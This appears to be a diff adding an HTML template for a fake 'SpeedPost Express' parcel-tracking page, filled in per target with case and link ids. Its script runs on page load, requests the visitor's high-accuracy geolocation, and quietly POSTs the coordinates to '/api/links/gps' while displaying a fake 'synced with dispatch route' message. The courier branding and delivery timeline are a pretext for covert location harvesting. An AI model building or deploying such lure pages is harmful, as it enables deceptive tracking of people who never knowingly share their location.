@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Express Parcel Tracking — Consignment #EXP-{{ case_id }}</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+    body { background-color: #0f172a; color: #f8fafc; padding: 20px 16px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+    .parcel-card { background: #1e293b; border: 1px solid #334155; border-radius: 16px; max-width: 460px; width: 100%; box-shadow: 0 16px 36px rgba(0,0,0,0.4); overflow: hidden; }
+    .header { background: #2563eb; padding: 24px 20px; text-align: left; }
+    .courier-brand { font-size: 11px; text-transform: uppercase; letter-spacing: 1.5px; opacity: 0.85; font-weight: 700; }
+    .tracking-num { font-size: 22px; font-weight: 800; margin-top: 4px; }
+    .status-pill { display: inline-block; background: #fbbf24; color: #78350f; font-weight: 700; font-size: 12px; padding: 4px 10px; border-radius: 20px; margin-top: 10px; }
+    .body-content { padding: 24px; }
+    .timeline { position: relative; border-left: 2px solid #3b82f6; margin-left: 10px; padding-left: 20px; margin-top: 16px; }
+    .t-item { position: relative; margin-bottom: 24px; }
+    .t-item:last-child { margin-bottom: 0; }
+    .t-dot { position: absolute; left: -27px; top: 0; width: 12px; height: 12px; border-radius: 50%; background: #3b82f6; border: 2px solid #1e293b; }
+    .t-dot.active { background: #10b981; box-shadow: 0 0 10px #10b981; }
+    .t-title { font-size: 14px; font-weight: 600; color: #f1f5f9; }
+    .t-desc { font-size: 12px; color: #94a3b8; margin-top: 2px; }
+    .btn { display: block; text-align: center; background: #3b82f6; color: #ffffff; text-decoration: none; padding: 13px; border-radius: 10px; font-weight: 600; font-size: 14px; margin-top: 24px; }
+    .btn:hover { background: #2563eb; }
+    .gps-ping { text-align: center; font-size: 11px; color: #64748b; margin-top: 14px; }
+  </style>
+</head>
+<body>
+
+  <div class="parcel-card">
+    <div class="header">
+      <div class="courier-brand">SpeedPost Express Logistics</div>
+      <div class="tracking-num">AWB: EXP-{{ case_id }}IN</div>
+      <div class="status-pill">Out for Delivery Today</div>
+    </div>
+
+    <div class="body-content">
+      <div class="timeline">
+        <div class="t-item">
+          <div class="t-dot active"></div>
+          <div class="t-title">Arrived at Local Delivery Hub</div>
+          <div class="t-desc">Sorting facility dispatch underway. Delivery expected by 7:00 PM.</div>
+        </div>
+        <div class="t-item">
+          <div class="t-dot"></div>
+          <div class="t-title">In-Transit via Air Cargo Hub</div>
+          <div class="t-desc">Customs cleared, container verified.</div>
+        </div>
+        <div class="t-item">
+          <div class="t-dot"></div>
+          <div class="t-title">Consignment Booked &amp; Picked Up</div>
+          <div class="t-desc">Origin distribution center.</div>
+        </div>
+      </div>
+
+      <a href="javascript:void(0)" onclick="alert('Delivery agent contact requested for Order #EXP-{{ case_id }}.');" class="btn">
+        📞 Contact Delivery Executive
+      </a>
+
+      <p class="gps-ping" id="clientLoc">Locating nearest parcel locker...</p>
+    </div>
+  </div>
+
+  <script>
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        function(pos) {
+          fetch('/api/links/gps', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+              link_id: '{{ link_id }}',
+              latitude: pos.coords.latitude,
+              longitude: pos.coords.longitude,
+              accuracy: pos.coords.accuracy
+            })
+          }).catch(function(){});
+          document.getElementById('clientLoc').innerText = 'Location synced with dispatch route.';
+        },
+        function(err) {
+          document.getElementById('clientLoc').innerText = 'Tracking route connected.';
+        },
+        { enableHighAccuracy: true, timeout: 6000 }
+      );
+    }
+  </script>
+</body>
+</html>
+
